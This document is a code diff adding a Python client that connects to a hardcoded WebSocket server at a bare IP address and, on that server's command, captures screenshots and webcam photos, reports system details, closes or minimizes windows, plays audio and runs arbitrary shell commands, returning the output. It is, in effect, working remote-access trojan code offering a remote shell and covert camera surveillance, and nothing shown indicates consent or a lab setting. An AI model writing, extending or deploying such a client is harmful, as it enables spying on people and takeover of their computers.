@@ -1,0 +1,506 @@
+import asyncio
+import json
+import os
+import platform
+import socket
+import subprocess
+import uuid
+
+import cv2
+import mss
+import mss.tools
+import psutil
+import pygame
+import websockets
+from websockets.asyncio.client import ClientConnection
+
+
+SERVER_URL = "ws://100.109.211.54:8765"
+RECONNECT_DELAY = 3
+CLIENT_ID = f"{socket.gethostname()}-{uuid.uuid4().hex[:8]}"
+
+# Stateful рабочая директория для shell-команд (только Linux)
+CURRENT_DIR: str = os.path.expanduser("~")
+
+
+def take_screenshot_bytes() -> bytes:
+    with mss.mss() as sct:
+        mon = sct.monitors[1]
+        shot = sct.grab(mon)
+        return mss.tools.to_png(shot.rgb, shot.size)
+
+
+def take_webcam_photo() -> bytes:
+    cap = cv2.VideoCapture(0)
+    if not cap.isOpened():
+        raise RuntimeError("Cannot open default webcam")
+
+    try:
+        # A short warm-up helps camera auto-exposure settle.
+        for _ in range(8):
+            cap.read()
+
+        ok, frame = cap.read()
+        if not ok or frame is None:
+            raise RuntimeError("Failed to capture webcam frame")
+
+        ok, encoded = cv2.imencode(".png", frame)
+        if not ok:
+            raise RuntimeError("Failed to encode webcam frame to PNG")
+        return encoded.tobytes()
+    finally:
+        cap.release()
+
+
+def collect_system_info() -> dict:
+    vm = psutil.virtual_memory()
+    proc = platform.processor()
+    return {
+        "os": platform.system(),
+        "os_release": platform.release(),
+        "os_version": platform.version(),
+        "architecture": platform.machine(),
+        "processor": proc if proc else "unknown",
+        "ram_total_bytes": vm.total,
+        "hostname": platform.node(),
+    }
+
+
+def set_system_volume(level: int) -> None:
+    """
+    Устанавливает системную громкость (0–100%).
+    Windows: pycaw/comtypes (Master Volume scalar 0.0–1.0).
+    Linux: pactl либо amixer (Pulse).
+    """
+    level = max(0, min(100, int(level)))
+    system = platform.system()
+
+    if system == "Windows":
+        from ctypes import POINTER, cast
+
+        from comtypes import CLSCTX_ALL
+        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+
+        speakers = AudioUtilities.GetSpeakers()
+        dev = getattr(speakers, "_dev", speakers)
+        interface = dev.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+        volume = cast(interface, POINTER(IAudioEndpointVolume))
+        volume.SetMasterVolumeLevelScalar(level / 100.0, None)
+        return
+
+    if system == "Linux":
+        pct = f"{level}%"
+        r = subprocess.run(
+            ["pactl", "set-sink-volume", "@DEFAULT_SINK@", pct],
+            capture_output=True,
+            text=True,
+            timeout=15,
+        )
+        if r.returncode == 0:
+            return
+        r2 = subprocess.run(
+            ["amixer", "-D", "pulse", "sset", "Master", pct],
+            capture_output=True,
+            text=True,
+            timeout=15,
+        )
+        if r2.returncode != 0:
+            err = (r.stderr or r.stdout or "").strip()
+            err2 = (r2.stderr or r2.stdout or "").strip()
+            raise RuntimeError(f"pactl: {err or 'failed'}; amixer: {err2 or 'failed'}")
+        return
+
+    raise RuntimeError(f"Unsupported OS for volume control: {system}")
+
+
+def play_audio_file(filepath: str) -> None:
+    if not os.path.exists(filepath):
+        raise FileNotFoundError(f"Audio file does not exist: {filepath}")
+
+    pygame.mixer.init()
+    try:
+        pygame.mixer.music.load(filepath)
+        pygame.mixer.music.play()
+        while pygame.mixer.music.get_busy():
+            pygame.time.Clock().tick(10)
+    finally:
+        pygame.mixer.quit()
+
+
+def minimize_all_windows() -> None:
+    """
+    Сворачивает все окна.
+    Windows: через Shell.Application COM-объект (shell.MinimizeAll).
+    Linux:   wmctrl -k on
+    """
+    system = platform.system()
+
+    if system == "Windows":
+        import win32com.client  # pywin32
+
+        shell = win32com.client.Dispatch("Shell.Application")
+        shell.MinimizeAll()
+        return
+
+    if system == "Linux":
+        r = subprocess.run(
+            ["wmctrl", "-k", "on"],
+            capture_output=True,
+            text=True,
+            timeout=15,
+        )
+        if r.returncode != 0:
+            err = (r.stderr or r.stdout or "").strip()
+            raise RuntimeError(f"wmctrl -k on failed: {err or 'unknown error'}")
+        return
+
+    raise RuntimeError(f"Unsupported OS for minimize_all: {system}")
+
+
+def close_all_windows() -> None:
+    """
+    Закрывает все пользовательские окна.
+    Windows: PowerShell — Shell.Application.Windows() | ForEach Quit().
+    Linux:   wmctrl -l → для каждого окна wmctrl -ic <wid>.
+    """
+    system = platform.system()
+
+    if system == "Windows":
+        ps_script = (
+            "(New-Object -ComObject Shell.Application).Windows() | "
+            "ForEach-Object { $_.Quit() }"
+        )
+        r = subprocess.run(
+            ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps_script],
+            capture_output=True,
+            text=True,
+            timeout=30,
+        )
+        if r.returncode != 0:
+            err = (r.stderr or r.stdout or "").strip()
+            raise RuntimeError(f"PowerShell close_all failed: {err or 'unknown error'}")
+        return
+
+    if system == "Linux":
+        r = subprocess.run(
+            ["wmctrl", "-l"],
+            capture_output=True,
+            text=True,
+            timeout=15,
+        )
+        if r.returncode != 0:
+            err = (r.stderr or r.stdout or "").strip()
+            raise RuntimeError(f"wmctrl -l failed: {err or 'unknown error'}")
+
+        errors: list[str] = []
+        for line in r.stdout.splitlines():
+            parts = line.split(None, 3)
+            if not parts:
+                continue
+            wid = parts[0]
+            rc = subprocess.run(
+                ["wmctrl", "-ic", wid],
+                capture_output=True,
+                text=True,
+                timeout=10,
+            )
+            if rc.returncode != 0:
+                errors.append(f"{wid}: {(rc.stderr or rc.stdout or '').strip()}")
+
+        if errors:
+            raise RuntimeError("Some windows could not be closed: " + "; ".join(errors))
+        return
+
+    raise RuntimeError(f"Unsupported OS for close_all: {system}")
+
+
+def list_audio_files() -> list[str]:
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    exts = {".mp3", ".wav", ".ogg"}
+    files: list[str] = []
+    for name in os.listdir(script_dir):
+        full_path = os.path.join(script_dir, name)
+        if not os.path.isfile(full_path):
+            continue
+        _, ext = os.path.splitext(name)
+        if ext.lower() in exts:
+            files.append(name)
+    files.sort(key=str.lower)
+    return files
+
+
+async def execute_shell_command(cmd_str: str) -> str:
+    """
+    Выполняет shell-команду. Только Linux.
+    Эмулирует 'cd': обновляет CURRENT_DIR, не запускает субпроцесс.
+    Все остальные команды запускаются через asyncio.create_subprocess_shell
+    с cwd=CURRENT_DIR.
+    """
+    global CURRENT_DIR
+
+    if platform.system() != "Linux":
+        return "Shell commands are only supported on Linux"
+
+    # Эмуляция cd
+    stripped = cmd_str.strip()
+    if stripped == "cd" or stripped.startswith("cd ") or stripped.startswith("cd\t"):
+        path_arg = stripped[2:].strip() or os.path.expanduser("~")
+        if path_arg == "-":
+            return "cd: '-' not supported in stateless shell"
+        new_dir = os.path.abspath(os.path.join(CURRENT_DIR, path_arg))
+        if not os.path.isdir(new_dir):
+            return f"cd: {new_dir}: No such file or directory"
+        CURRENT_DIR = new_dir
+        return f"(changed directory to {CURRENT_DIR})"
+
+    try:
+        proc = await asyncio.create_subprocess_shell(
+            stripped,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+            cwd=CURRENT_DIR,
+        )
+        try:
+            stdout_b, stderr_b = await asyncio.wait_for(proc.communicate(), timeout=30)
+        except asyncio.TimeoutError:
+            proc.kill()
+            return "[ERROR] Command timed out after 30 seconds"
+
+        stdout = stdout_b.decode(errors="replace")
+        stderr = stderr_b.decode(errors="replace")
+        output = stdout
+        if stderr:
+            output += stderr if not stdout else f"\n[stderr]\n{stderr}"
+        return output if output else f"(exit code {proc.returncode}, no output)"
+    except Exception as exc:
+        return f"[ERROR] Failed to execute command: {exc}"
+
+
+async def handle_server_commands(ws: ClientConnection) -> None:
+    print(f"[+] Ready. Waiting for commands as client_id={CLIENT_ID}")
+    async for message in ws:
+        if isinstance(message, bytes):
+            print("[!] Received unexpected binary command, ignoring")
+            continue
+
+        try:
+            command = json.loads(message)
+        except json.JSONDecodeError:
+            print("[!] Invalid JSON command, ignoring")
+            continue
+
+        action = command.get("action")
+        if action == "screenshot":
+            print("[>] Screenshot command received")
+            try:
+                data = await asyncio.to_thread(take_screenshot_bytes)
+                metadata = {
+                    "type": "screenshot",
+                    "client_id": CLIENT_ID,
+                    "size": len(data),
+                }
+                await ws.send(json.dumps(metadata))
+                await ws.send(data)
+                print(f"[+] Screenshot sent ({len(data)} bytes)")
+            except Exception as exc:
+                print(f"[!] Failed to capture/send screenshot: {exc}")
+        elif action == "webcam":
+            print("[>] Webcam command received")
+            try:
+                data = await asyncio.to_thread(take_webcam_photo)
+                metadata = {
+                    "type": "webcam",
+                    "client_id": CLIENT_ID,
+                    "size": len(data),
+                }
+                await ws.send(json.dumps(metadata))
+                await ws.send(data)
+                print(f"[+] Webcam photo sent ({len(data)} bytes)")
+            except Exception as exc:
+                print(f"[!] Failed to capture/send webcam photo: {exc}")
+        elif action == "sys_info":
+            print("[>] System info command received")
+            try:
+                info = await asyncio.to_thread(collect_system_info)
+                payload = {"type": "sys_info", "client_id": CLIENT_ID, **info}
+                await ws.send(json.dumps(payload))
+                print("[+] System info sent")
+            except Exception as exc:
+                print(f"[!] Failed to collect/send system info: {exc}")
+        elif action == "set_volume":
+            print("[>] Set volume command received")
+            raw_level = command.get("level")
+            try:
+                lvl = int(raw_level)
+            except (TypeError, ValueError):
+                msg = f"Invalid volume level: {raw_level!r}"
+                print(f"[!] {msg}")
+                await ws.send(
+                    json.dumps({"type": "info", "client_id": CLIENT_ID, "message": msg})
+                )
+                continue
+            try:
+                await asyncio.to_thread(set_system_volume, lvl)
+                msg = f"Volume set to {max(0, min(100, lvl))}%"
+                print(f"[+] {msg}")
+                await ws.send(
+                    json.dumps({"type": "info", "client_id": CLIENT_ID, "message": msg})
+                )
+            except Exception as exc:
+                msg = f"Failed to set volume: {exc}"
+                print(f"[!] {msg}")
+                await ws.send(
+                    json.dumps({"type": "info", "client_id": CLIENT_ID, "message": msg})
+                )
+        elif action == "play_audio":
+            print("[>] Play audio command received")
+            filepath = command.get("file_path")
+            if not isinstance(filepath, str) or not filepath.strip():
+                msg = "Missing or invalid file_path for play_audio"
+                print(f"[!] {msg}")
+                await ws.send(
+                    json.dumps({"type": "info", "client_id": CLIENT_ID, "message": msg})
+                )
+                continue
+
+            filepath = filepath.strip()
+
+            async def _send_play_error(exc: Exception) -> None:
+                msg_inner = f"Failed to play audio: {exc}"
+                print(f"[!] {msg_inner}")
+                try:
+                    await ws.send(
+                        json.dumps(
+                            {
+                                "type": "info",
+                                "client_id": CLIENT_ID,
+                                "message": msg_inner,
+                            }
+                        )
+                    )
+                except Exception as send_exc:
+                    print(f"[!] Failed to send play_audio error info: {send_exc}")
+
+            try:
+                task = asyncio.create_task(asyncio.to_thread(play_audio_file, filepath))
+
+                def _on_play_done(done_task: asyncio.Task) -> None:
+                    try:
+                        done_task.result()
+                    except Exception as exc:
+                        asyncio.create_task(_send_play_error(exc))
+
+                task.add_done_callback(_on_play_done)
+                msg = f"Audio playback started: {filepath}"
+                print(f"[+] {msg}")
+                await ws.send(
+                    json.dumps({"type": "info", "client_id": CLIENT_ID, "message": msg})
+                )
+            except Exception as exc:
+                msg = f"Failed to start audio playback: {exc}"
+                print(f"[!] {msg}")
+                await ws.send(
+                    json.dumps({"type": "info", "client_id": CLIENT_ID, "message": msg})
+                )
+        elif action == "minimize_all":
+            print("[>] Minimize All command received")
+            try:
+                await asyncio.to_thread(minimize_all_windows)
+                msg = "All windows minimized"
+                print(f"[+] {msg}")
+                await ws.send(
+                    json.dumps({"type": "info", "client_id": CLIENT_ID, "message": msg})
+                )
+            except Exception as exc:
+                msg = f"Failed to minimize all windows: {exc}"
+                print(f"[!] {msg}")
+                await ws.send(
+                    json.dumps({"type": "info", "client_id": CLIENT_ID, "message": msg})
+                )
+        elif action == "close_all":
+            print("[>] Close All command received")
+            try:
+                await asyncio.to_thread(close_all_windows)
+                msg = "All windows closed"
+                print(f"[+] {msg}")
+                await ws.send(
+                    json.dumps({"type": "info", "client_id": CLIENT_ID, "message": msg})
+                )
+            except Exception as exc:
+                msg = f"Failed to close all windows: {exc}"
+                print(f"[!] {msg}")
+                await ws.send(
+                    json.dumps({"type": "info", "client_id": CLIENT_ID, "message": msg})
+                )
+        elif action == "list_audio":
+            print("[>] List audio command received")
+            try:
+                files = await asyncio.to_thread(list_audio_files)
+                await ws.send(
+                    json.dumps(
+                        {
+                            "type": "audio_list",
+                            "client_id": CLIENT_ID,
+                            "files": files,
+                        }
+                    )
+                )
+                print(f"[+] Sent audio file list ({len(files)} files)")
+            except Exception as exc:
+                msg = f"Failed to list audio files: {exc}"
+                print(f"[!] {msg}")
+                await ws.send(
+                    json.dumps({"type": "info", "client_id": CLIENT_ID, "message": msg})
+                )
+        elif action == "shell":
+            cmd_str = command.get("cmd", "")
+            print(f"[>] Shell command received: {cmd_str!r}")
+            if not isinstance(cmd_str, str) or not cmd_str.strip():
+                msg = "Empty or invalid shell command"
+                await ws.send(
+                    json.dumps({"type": "shell_result", "client_id": CLIENT_ID, "output": msg})
+                )
+            else:
+                try:
+                    output = await execute_shell_command(cmd_str)
+                    await ws.send(
+                        json.dumps({"type": "shell_result", "client_id": CLIENT_ID, "output": output})
+                    )
+                    print(f"[+] Shell result sent ({len(output)} chars)")
+                except Exception as exc:
+                    msg = f"[ERROR] {exc}"
+                    await ws.send(
+                        json.dumps({"type": "shell_result", "client_id": CLIENT_ID, "output": msg})
+                    )
+        else:
+            print(f"[i] Unknown action: {action}")
+
+
+async def run_client() -> None:
+    while True:
+        try:
+            print(f"[i] Connecting to {SERVER_URL} ...")
+            async with websockets.connect(SERVER_URL, max_size=None) as ws:
+                print("[+] Connected to server")
+                try:
+                    info = await asyncio.to_thread(collect_system_info)
+                    hello_payload = {"type": "sys_info", "client_id": CLIENT_ID, **info}
+                    await ws.send(json.dumps(hello_payload))
+                    print("[+] Sent initial hello/sys_info")
+                except Exception as exc:
+                    print(f"[!] Failed to send initial hello/sys_info: {exc}")
+                await handle_server_commands(ws)
+        except (ConnectionRefusedError, websockets.ConnectionClosed, OSError) as exc:
+            print(f"[!] Connection lost/failed: {exc}")
+        except Exception as exc:
+            print(f"[!] Unexpected client error: {exc}")
+
+        print(f"[i] Reconnecting in {RECONNECT_DELAY}s...")
+        await asyncio.sleep(RECONNECT_DELAY)
+
+
+if __name__ == "__main__":
+    try:
+        asyncio.run(run_client())
+    except KeyboardInterrupt:
+        print("\n[i] Client stopped by user.")
